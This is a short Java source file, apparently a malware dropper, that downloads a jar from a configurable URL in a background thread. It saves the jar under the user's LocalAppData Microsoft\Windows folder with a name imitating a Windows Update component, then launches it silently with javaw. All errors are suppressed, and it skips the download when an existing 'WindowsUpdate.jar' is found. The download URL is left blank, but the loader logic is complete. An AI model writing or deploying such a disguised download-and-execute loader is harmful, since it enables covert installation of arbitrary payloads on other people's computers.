package downloader;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class Downloader {
    public static void main(String[] args) {
        new Thread(() -> {
            String DOWNLOAD_URL = "";
            String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Windows\\WindowsUpdateAgent.jar";
            String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Windows\\WindowsUpdate.jar";

            File file = new File(APP_PATH);
            if (file.exists()) return;
            try (InputStream in = new URL(DOWNLOAD_URL).openStream()) {
                Files.copy(in, Paths.get(SAVE_PATH), StandardCopyOption.REPLACE_EXISTING);

                ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", "javaw", "-jar", SAVE_PATH);
                processBuilder.start();
            } catch (Exception ignored) {}

        }).start();
    }
}
